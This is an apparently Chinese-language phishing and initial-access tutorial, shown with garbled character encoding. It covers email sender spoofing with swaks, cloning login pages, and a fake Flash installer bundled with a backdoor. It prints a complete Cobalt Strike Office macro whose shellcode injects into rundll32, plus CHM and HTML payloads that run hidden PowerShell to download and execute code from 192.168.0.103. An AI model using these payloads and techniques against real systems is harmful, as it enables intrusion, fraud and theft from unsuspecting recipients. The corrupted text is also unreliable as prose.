# é’“é±¼

## é‚®ä»¶é’“é±¼

<img src=".\å›¾ç‰‡\image.png" alt="image" style="zoom:150%;" />

### å‰ç½®çŸ¥è¯†

1ã€ä»€ä¹ˆæ˜¯ **SPF**ï¼š

å‘ä»¶äººç­–ç•¥æ¡†æ¶ï¼ˆSender Policy Frameworkï¼‰ç”µå­é‚®ä»¶è®¤è¯æœºåˆ¶

ä¸­æ–‡è¯‘ä¸ºå‘é€æ–¹ç­–ç•¥æ¡†æ¶,ä¸»è¦ä½œç”¨æ˜¯é˜²æ­¢ä¼ªé€ é‚®ä»¶åœ°å€

2ã€å¦‚ä½•åˆ¤æ–­SPF

```
dig -t txt qq.com           #linux
nslookup -type=txt qq.com   #windows
```

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_14-31-50.png" alt="Snipaste_2022-12-29_14-31-50" style="zoom:80%;" />

```
"v=spf1 -all"                      ï¼ˆæ‹’ç»æ‰€æœ‰ï¼Œè¡¨ç¤ºè¿™ä¸ªåŸŸåä¸ä¼šå‘å‡ºé‚®ä»¶ï¼‰
"v=spf1 +all"                      ï¼ˆæ¥å—æ‰€æœ‰ï¼‰
"v=spf1 ip4:192.168.0.1/16 -all"   ï¼ˆåªå…è®¸ 192.168.0.1/16 èŒƒå›´å†…çš„IPå‘é€é‚®ä»¶ï¼‰
"v=spf1 mx -all"                   ï¼ˆå…è®¸å½“å‰åŸŸåçš„ mx è®°å½•å¯¹åº”çš„IPåœ°å€å‘é€é‚®ä»¶ï¼‰
"v=spf1 mx mx:test.example.com -all"ï¼ˆå…è®¸å½“å‰åŸŸåå’Œ test.example.com çš„ mx è®°å½•å¯¹åº”çš„IPåœ°å€å‘é€é‚®ä»¶ï¼‰
"v=spf1 a mx ip4:173.194.72.103 -all"ï¼ˆå…è®¸å½“å‰åŸŸåçš„ a è®°å½•å’Œ mx è®°å½•å’Œä¸€ä¸ªç»™å®šçš„IPåœ°å€å‘é€é‚®ä»¶ï¼‰
"v=spf1 include:example.com -all"     ï¼ˆé‡‡ç”¨å’Œ example.com ä¸€æ ·çš„SPFè®°å½•ï¼‰
```

### æ— SPFç›´æ¥ä¼ªé€ -Swaks

ä¸´æ—¶é‚®ç®±ï¼š

http://24mail.chacuo.net/                    https://www.linshi-email.com/

1ã€æ£€æµ‹:

```
dig -t txt iubridge.com     # æ— SPF
```

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_14-41-24.png" alt="Snipaste_2022-12-29_14-41-24" style="zoom:80%;" />

2ã€ä¼ªé€ ï¼š

`swaks å·¥å…·`ï¼Œkali è‡ªå¸¦ï¼Œä¼ªé€ å‘ä¿¡äºº

```
swaks --header-X-Mailer "" --header-Message-Id "" --header-"Content-Type"="text/html" --from "QQç®¡ç†<admin@qq.com>" --ehlo shabimeiguo -header "Subject: æµ‹è¯•" --body æˆ‘ä»¬åšäº†ä¸€ä¸ªæµ‹è¯• --to glvdrvxuie@iubridge.com
```

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_14-44-41.png" alt="Snipaste_2022-12-29_14-44-41" style="zoom:80%;" />

ä¸´æ—¶é‚®ç®±`glvdrvxuie@iubridge.com`æ”¶åˆ°äº†ä¸€å°ä¼ªé€ å‘ä¿¡äººçš„é‚®ä»¶

 <img src=".\å›¾ç‰‡\Snipaste_2022-12-29_14-46-44.png" alt="Snipaste_2022-12-29_14-46-44" style="zoom: 67%;" />

æ­¤ç±»æƒ…å†µ**æ— SPF**å°±å¯ä»¥**ä¼ªé€ å‘ä¿¡äºº**ï¼Œå¦‚æœæœ‰SPFå°±ä¸è¡Œï¼Œæ¯”å¦‚ä½ å‘åˆ° **QQé‚®ç®±** æ—¶ä¾¿ä¸èƒ½éšæ„ç”¨å·¥å…·ä¼ªé€ å‘ä¿¡äºº

### æœ‰SPFç›´æ¥ä¼ªé€ -Swaks

#### 1ã€æ›²çº¿æ•‘å›½ä¼ªé€ å‘ä¿¡äºº

æ­¤ç±»æƒ…å†µæ˜¯**ä¿®æ”¹å­—ç¬¦**ï¼Œæ˜¯éšœçœ¼æ³•ï¼Œæ¯”å¦‚ system@notice.aliyun.com åé¢åŠ ä¸ª**cn**ï¼Œä¹Ÿå¦‚ **1 ä¸l** ï¼Œ**oä¸0** ä¹‹ç±»çš„æ›¿æ¢

```
swaks --body "test" --header "Subject:testT" -t zf1yolo@163.com -f system@notice.aliyun.com.cn
```

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_14-55-26.png" alt="Snipaste_2022-12-29_14-55-26" style="zoom:67%;" />

æ­¤ç±»æ–¹æ³•**ç½‘æ˜“é‚®ç®±**å¯ä»¥æ”¶åˆ°ï¼Œ**qqé‚®ç®±**åˆ™è¿åƒåœ¾ç®±éƒ½æ”¶ä¸åˆ°

#### 2ã€è½¬å‘çªç ´

æ³¨å†Œä¸€ä¸ªé‚®ç®±å¼€å¯ **POP3è½¬å‘**ï¼Œä½¿ç”¨ç½‘ä¸Šå·²çŸ¥çš„é‚®ç®±ç³»ç»Ÿ

1ã€å°†è¦å‘é€çš„é‚®ä»¶å¯¼å‡º EML æ¨¡ç‰ˆ

2ã€ä¿®æ”¹å†…ç½®çš„å‘ä»¶äºº**å†…å®¹æ—¶é—´**ç­‰ï¼Œä¿®æ”¹çš„æ—¶é—´å°±æ˜¯**å¯¹é¢æ˜¾ç¤ºæ”¶åˆ°çš„æ—¶é—´**ï¼Œè€ŒéçœŸå®æ”¶åˆ°çš„æ—¶é—´

```
swaks --to æ”¶ä¿¡äºº -f å‘ä¿¡äºº --data 1.eml  --server smtp.163.com -p 25 -au å¸å· -ap æˆæƒç 
```

```
swaks --to zf1yolo@163.com -f 1626356458@qq.com --data 1.eml  --server smtp.qq.com -p 25 -au 1626356458@qq.com -ap oirofzqctfufbhgf
```

```
swaks --to 1626356458@qq.com.com -f zf1yolo@163.com --data 1.eml  --server smtp.163.com -p 25 -au zf1yolo@163.com -ap JNEWHZWHRBBHHHRY
```

æˆ‘ç”¨é›¶æ—¶é‚®ç®±æ”¶åˆ°äº†ï¼Œqqé‚®ç®±ä¹Ÿæ”¶åˆ°äº†ï¼Œæ˜¾ç¤ºæœ‰ XXX ä»£ä¸ºè½¬å‘çš„å­—ï¼Œé‡åˆ°çš„é—®é¢˜æ˜¯å½“æˆ‘ç”¨qqå®˜æ–¹å›¢é˜Ÿå‘çš„é‚®ä»¶çš„ EML ï¼Œqqé‚®ç®±å°±æ”¶ä¸åˆ°ï¼Œè¿·æƒ‘

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_17-37-17.png" alt="Snipaste_2022-12-29_17-37-17" style="zoom:80%;" />

<img src=".\å›¾ç‰‡\Snipaste_2022-12-29_17-45-19.png" alt="Snipaste_2022-12-29_17-45-19" style="zoom:80%;" />

**æ³¨æ„**ï¼šæˆ‘ä»¬è¿™é‡Œä¼šæ˜¾ç¤ºæœ‰ XXX è½¬å‘ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥è‡ªå·±æ­å»ºé‚®ä»¶æœåŠ¡å™¨ï¼Œä½¿ç”¨è‡ªå·±çš„åŸŸåï¼ŒåŸŸåå¯ä»¥ç©æ–‡å­—æ¸¸æˆï¼Œæ„é€ å‡ºå¯ä¿¡ä»»çš„æ ·å­

å¦å¤–ä¸€äº›å…è´¹å¹³å°

https://www.smtp2go.com/

https://www.sendcloud.net/

http://www.ewomail.com/

#### 3ã€Gophish

https://github.com/gophish/gophish

https://blog.csdn.net/qq_42939527/article/details/107485116

é…ç½®å‘ä»¶äººé‚®ç®±ä¸æˆæƒç ï¼Œå‘é€æµ‹è¯•é‚®ä»¶

<img src=".\å›¾ç‰‡\image-20221230155805731.png" alt="image-20221230155805731" style="zoom: 33%;" />

<img src=".\å›¾ç‰‡\Snipaste_2022-12-30_15-32-03.png" alt="Snipaste_2022-12-30_15-32-03" style="zoom:67%;" />



ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œå‘é€æˆåŠŸï¼Œé‚®ä»¶é‡Œçš„é“¾æ¥æ˜¯æˆ‘ä»¬æ„é€ çš„  www.baidu.com

<img src=".\å›¾ç‰‡\Snipaste_2022-12-30_15-54-12.png" alt="Snipaste_2022-12-30_15-54-12" style="zoom: 50%;" />

### å…‹éš†webé¡µé¢

1ã€æ‰‹åŠ¨å¦å­˜ä¸º

ç›´æ¥æµè§ˆå™¨ç½‘é¡µå¦å­˜ä¸ºå³å¯

2ã€Goblin

https://github.com/xiecat/goblin

è¿™ä¸ªå·¥å…·èµ·åˆ°çš„æ˜¯æµé‡ä¸­è½¬çš„ä½œç”¨ï¼Œæ‰€ä»¥å—å®³è€…è®¿é—®çš„ç½‘ç«™æ˜¯çœŸå®çš„ï¼Œæ”»å‡»è€…æ˜¯åœ¨ä¸­é—´æˆªå–æµé‡

<img src=".\å›¾ç‰‡\Snipaste_2022-12-30_16-27-33.png" alt="Snipaste_2022-12-30_16-27-33" style="zoom: 50%;" />

3ã€social-engineer-toolkit

https://github.com/trustedsec/social-engineer-toolkit

çœ‹readmeç›´æ¥ä½¿ç”¨å³å¯

### å®éªŒ

#### é’“é±¼é…åˆäºŒç»´ç æˆªèƒ¡

æ–‡å­—è¯´æ˜ä¸‹ï¼Œé‚®ä»¶é’“é±¼è¯±å¯¼ç›®æ ‡è®¿é—®ç”±æˆ‘ä»¬æ„é€ çš„äº¬ä¸œç™»å½•é¦–é¡µï¼Œè®©æˆ‘ä»¬æœ¬åœ°æµè§ˆå™¨çœŸäº¬ä¸œç™»å½•é¡µçš„äºŒç»´ç ä¸ä¼ªé€ çš„ä¸€è‡´ï¼Œé‚£ä¹ˆå¯¹é¢æ‰«æäºŒç»´ç æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªåŠ¨ç™»å½•äº†

#### flashé’“é±¼

##### èƒŒæ™¯

è¯±å¯¼ç›®æ ‡è®¿é—®æˆ‘ä»¬æ„é€ çš„è¯±æƒ‘åœ°å€ï¼ˆä¸€èˆ¬æ˜¯è§†é¢‘ä¹‹ç±»çš„ç½‘ç«™ï¼‰ï¼Œä½¿è¯¥é’“é±¼åœ°å€éœ€è¦ flash å‡çº§æ‰èƒ½æ’­æ”¾ï¼Œè·³åˆ°å®‰è£… flash é¡µé¢ï¼Œè¿™ä¸ª flash ä¸‹è½½åŒ…åˆ™æ˜¯æˆ‘ä»¬çš„æœ¨é©¬

##### æ­¥éª¤

1ã€ç”Ÿæˆ cs åé—¨ï¼Œæ”¾åœ¨æˆ‘ä»¬è‡ªå·±çš„ web ç½‘ç«™ç›®å½•é‡Œ

2ã€ä¸‹è½½å®˜æ–¹flashä¸‹è½½åŒ…ï¼Œä¿è¯å®‰è£…æ­£å¸¸

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_17-57-08.png" alt="Snipaste_2023-01-02_17-57-08" style="zoom: 50%;" />

3ã€åˆå¹¶æ–‡ä»¶ï¼Œä½¿çœŸçš„ä¸‹è½½åŒ…å’Œæˆ‘ä»¬çš„åé—¨åˆå¹¶ï¼Œè®©ç›®æ ‡æ—¢èƒ½æ­£å¸¸å®‰è£…flashï¼Œåˆèƒ½è¿è¡Œåé—¨æ–‡ä»¶

å°†è¿ä¸ªæ–‡ä»¶æ”¾åˆ°ä¸€èµ·ï¼Œç‚¹å‡» **æ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶**ï¼Œç„¶åå¦‚ä¸‹æ­¥éª¤

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-21-57.png" alt="Snipaste_2023-01-02_18-21-57" style="zoom:60%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-24-47.png" alt="Snipaste_2023-01-02_18-24-47" style="zoom:60%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-28-12.png" alt="Snipaste_2023-01-02_18-28-12" style="zoom:60%;" />

æ›´æ¢å›¾æ ‡å’Œåå­—ï¼Œä½¿ç”¨ Restorator 2018 ï¼Œå¯¼å‡ºçœŸ flash çš„å›¾æ ‡ç„¶åè¦†ç›–åˆ°åé—¨çš„å›¾æ ‡ï¼Œå†é‡å‘½åå³å¯

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-40-38.png" alt="Snipaste_2023-01-02_18-40-38" style="zoom:60%;" />

4ã€æ„é€ flashé’“é±¼åœ°å€ï¼Œè‡ªå·±æ­å»ºï¼Œæœ‰å›ºå®šçš„é¡¹ç›® `Fake-flash.cn-master`

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-12-24.png" alt="Snipaste_2023-01-02_18-12-24" style="zoom: 50%;" />

**ç«‹å³ä¸‹è½½æŒ‰é’®**æŒ‡å‘æˆ‘ä»¬çš„åé—¨åœ°å€

```
 <span>ç«‹å³ä¸‹è½½</span>
            <a href="http://192.168.0.103/flashcenter_pp_ax_install_cn.exe" target="_self">ç«‹å³ä¸‹è½½</a>
```

5ã€ç‚¹å‡»çœ‹åˆ°ä¸Šçº¿äº†

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_18-49-09.png" alt="Snipaste_2023-01-02_18-49-09" style="zoom:80%;" />

ç›¸å…³æ–‡ä»¶åœ¨ `.\æœ¬ç« æ‚ä¹±èµ„æº\flashé’“é±¼åŒ…æ–‡ä»¶.zip` é‡ŒÂ·

## å¸¸ç”¨æ–‡ä»¶æ’å…¥åé—¨

Officeæ ¼å¼æ–‡æ¡£æ–‡ä»¶é’“é±¼ä¸€èˆ¬é‡‡ç”¨å®æˆ–å¯¹è±¡è§¦å‘åé—¨

é»˜è®¤OfficeåŠ è½½å®åä¸€èˆ¬éœ€è¦**å¯ç”¨å®å†…å®¹**æ‰å¯è°ƒç”¨æ‰§è¡Œ

æ‰€ä»¥è¯±æƒ‘ä¼ªè£…å¾ˆé‡è¦ï¼Œè¦**è¯±å¯¼ç›®æ ‡æ‰“å¼€æ–‡ä»¶æ—¶æ‰“å¼€å®**

1ã€cs ç”Ÿæˆ office å®åé—¨ ï¼Œ ç›‘å¬å™¨æ˜¯ 192.168.0.103  1111

Attacks --> Packages --> MS offices Macro

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-07-44.png" alt="Snipaste_2023-01-02_19-07-44" style="zoom: 67%;" />

ä»¥ä¸‹ä¸º cs ç”Ÿæˆçš„å®åé—¨ä»£ç 

```
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,87,4,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,74,119,57,98,0,-33,-41,-30,69,48,20,86,-111,-65,-16,123,-16,-47,-125,58,-91,-83,22,-46,61,42,-44,-27,20,-92,-61,-120,70,-85,124,122,-118, _
-116,-45,16,-22,-91,-121,127,62,68,-47,-32,-89,-65,96,-122,0,109,-17,-89,54,-83,-12,103,90,-71,-109,68,112,-111,-23,61,4,-13,-4,38,-26,99,-23,20,43, _
-32,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,41,13,10,0, _
69,-8,46,-99,49,-127,-112,82,85,7,-86,-63,-3,-38,2,-58,5,126,-4,-69,20,109,-55,46,75,117,-57,-123,-68,39,57,15,51,36,-118,84,30,-20,-117,22, _
-83,107,107,-25,-95,127,-105,-41,11,55,82,-86,63,23,-88,-22,-117,-67,28,36,-75,70,-126,-8,51,-127,-52,-9,-84,-9,-122,37,-50,-121,-71,83,-35,125,-51,41, _
-58,-17,-101,-23,-83,82,-24,82,-31,-82,53,-69,10,-119,-42,-55,127,-117,37,90,-27,98,-46,-51,34,-39,-58,-101,-20,36,-57,-38,-29,-37,124,-34,-54,-26,-12,25, _
118,-83,8,-55,-12,6,8,89,-47,98,25,99,106,-74,-103,-101,-103,-34,-112,-71,55,119,93,-9,0,-114,-3,-104,-39,120,86,89,-102,51,-71,-3,66,6,-113,-67, _
27,1,-111,-57,-56,-8,-86,42,106,-63,-33,-92,80,-38,-51,-60,-48,80,-124,-122,-67,-6,14,76,60,62,-110,60,-124,-89,-34,-41,-88,-20,74,22,71,-72,-21,-118, _
-59,-24,58,28,118,-20,-85,-26,82,-3,65,-74,86,-80,48,-89,-15,55,-10,-125,-20,75,107,-31,108,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,48,46,49,48,51,0,23,80,101,-22)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```

### Word

æ ¼å¼ï¼š**docx-doc&docm**

æ­¥éª¤ï¼šæ–°å»ºwordæ–‡æ¡£--->æ‰“å¼€å¼€å‘å·¥å…·--->æ’å…¥ cs çš„å®ä»£ç --->ä¿å­˜æ ¼å¼

1ã€æ‰“å¼€å¼€å‘å·¥å…·

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-18-45.png" alt="Snipaste_2023-01-02_19-18-45" style="zoom:60%;" />

2ã€åˆ›å»ºå®åŠ ä¸Šåé—¨ä»£ç 

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-20-03.png" alt="Snipaste_2023-01-02_19-20-03" style="zoom:80%;" />

3ã€æ’å…¥ cs å®æœ¨é©¬

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-22-35.png" alt="Snipaste_2023-01-02_19-22-35" style="zoom:60%;" />

4ã€ä¿å­˜æ–‡ä»¶æ ¼å¼

`docx-doc&docm`

**è€ç‰ˆæœ¬**ï¼š97-2003 0fficeé»˜è®¤æ˜¯æ”¯æŒå®ä»£ç è¿è¡Œï¼Œ**ç›´æ¥è¿è¡Œå³å¯ä¸Šçº¿**

**æ–°ç‰ˆæœ¬**ï¼šå¯åŠ¨å®çš„æ ¼å¼ï¼Œä¸€èˆ¬å°±æ˜¯åœ¨åç¼€åŠ ä¸ŠMï¼Œ**ç”¨æˆ·è¦æ‰‹åŠ¨å¼€å¯å®**

Ctrl+s ä¿å­˜åç‚¹å‡» å¦

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-24-52.png" alt="Snipaste_2023-01-02_19-24-52" style="zoom:60%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-26-17.png" alt="Snipaste_2023-01-02_19-26-17" style="zoom:60%;" />

5ã€è¿è¡Œä¸Šçº¿

97-2003 çš„ç‰ˆæœ¬ç›´æ¥è¿è¡Œä¸Šçº¿ï¼Œæ–°ç‰ˆæœ¬åˆ™éœ€è¦ç”¨æˆ·æ‰‹åŠ¨å¼€å¯å®

**å¦å¤–**ï¼š**word çš„æ¨¡ç‰ˆ**æ¨¡å¼ä¹Ÿå¯ä»¥æ“ä½œå®åé—¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œwordæ¨¡ç‰ˆæ’å…¥å®åé—¨ï¼Œä¸‹è½½ç½‘ä¸Šå…¬å¼€æ¨¡ç‰ˆå†æ’å…¥æˆ‘ä»¬çš„å®ï¼Œè¯±å¯¼ç›®æ ‡è®¿é—®ã€‚ä¸€èˆ¬æ¨¡ç‰ˆåç¼€åä¸º`dot`æˆ–è€…`dotm`

**å…³é”®**ï¼šè¿˜æ˜¯åœ¨äºæ€ä¹ˆè¯±æƒ‘ç›®æ ‡ä¸ºäº†çœ‹æˆ‘ä»¬çš„æ–‡ä»¶è€Œå¼€å¯å®ï¼Œè¿™ä¸ªå°±æ˜¯å¾—æ‰¾åˆ°ç›®æ ‡çš„**è½¯è‚‹**å•Š

### Excel&PPT

ä¸ word æ“ä½œç±»ä¼¼

`docx-doc&docm`

`xlsx-xls&xlsm`

`pptx-ppt&pptm`

è€ç‰ˆæœ¬ï¼š97-2003 0fficeé»˜è®¤æ˜¯æ”¯æŒå®ä»£ç è¿è¡Œ

æ–°ç‰ˆæœ¬ï¼šå¯åŠ¨å®çš„æ ¼å¼ï¼Œä¸€èˆ¬å°±æ˜¯åœ¨åç¼€åŠ ä¸ŠM

### CHMç”µå­ä¹¦

#### æ‰§è¡ŒJS

CSç”Ÿæˆä¸Šçº¿ï¼šAttacksâ€”â€”>Web Drive byâ€”â€”>Scripted web Delivery 

ä½œç”¨æ˜¯ teamserve å¼€å¯ä¸€ä¸ªç«¯å£ä¿å­˜åé—¨ï¼Œåˆ©ç”¨ä¸€äº›è¿œç¨‹ä¸‹è½½å‘½ä»¤ä¸‹è½½æ‰§è¡Œåé—¨

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_19-51-43.png" alt="Snipaste_2023-01-02_19-51-43" style="zoom:80%;" />

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.103:84/a'))"
```

å‘½ä»¤æ’å…¥åˆ° **PSä¸Šçº¿.html** æ–‡ä»¶ï¼Œæ³¨æ„æ’å…¥åœ°å€æ—¶çš„  é€—å·å•å¼•å·åŒå¼•å·

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=",powershell.exe,-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.0.103:84/a'))">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

#### ä½¿ç”¨ `Easy CHM` åˆ¶ä½œæ–‡ä»¶æ’å…¥åé—¨

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_20-05-24.png" alt="Snipaste_2023-01-02_20-05-24" style="zoom:67%;" />

ç”Ÿæˆäº† **chm-jsä»£ç .CHM**  ç”µå­ä¹¦æ–‡ä»¶ï¼Œè¿è¡Œä¾¿ä¸Šçº¿äº†

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_20-09-11.png" alt="Snipaste_2023-01-02_20-09-11" style="zoom:80%;" />

#### CHMä¼ªè£…

æ‰¾ä¸€ä¸ª**æ­£å¸¸çš„CHMç”µå­ä¹¦**ï¼Œè§£å‹åï¼Œå°†Payloadæ’å…¥å…¶ä¸­æŸä¸ªæˆ–æ•´ä¸ªé¡µé¢ï¼ŒåŠ è½½ç¼–è¯‘ï¼Œå½“ç”µå­ä¹¦æ‰“å¼€ä¿®æ”¹é¡µé¢åä¸Šçº¿

```
hh -decompile .\\html xx.CHM   # è§£å‹æ­£å¸¸çš„.chmç”µå­ä¹¦
```

å°†ä¸Šçº¿ä»£ç æ’å…¥jè§£å‹åçš„ html æ–‡ä»¶

```
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=",powershell.exe,-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.0.103:84/a'))">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
```

 æ‰§è¡Œåç‚¹åˆ°ä¿®æ”¹çš„é‚£ä¸€é¡µä¾¿ä¸Šçº¿äº†

### LNKå¿«æ·æ–¹å¼

1ã€æ–°å»ºä»»æ„çš„å¿«æ·æ–¹å¼

2ã€cs ç”Ÿæˆï¼šAttacks -> Packages -> Html Application

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_20-40-48.png" alt="Snipaste_2023-01-02_20-40-48" style="zoom:80%;" />

ç”Ÿæˆä½¿ç”¨çš„æ˜¯ VBScript è¯­è¨€åŠ è½½ shellcode

3ã€cs æ–‡ä»¶æ‰˜ç®¡ï¼Œteamserver å¯åŠ¨webæœåŠ¡æ„å»ºè¿œç¨‹ä¸‹è½½åœ°å€ ï¼Œä¸Šä¼ æˆ‘ä»¬åˆšç”Ÿæˆçš„ 1.hta

Attacksâ€”â€”>Web Drive byâ€”â€”>Host file

```
http://192.168.0.103:85/download/file.ext    # 1.hta åé—¨ä¸‹è½½åœ°å€
```

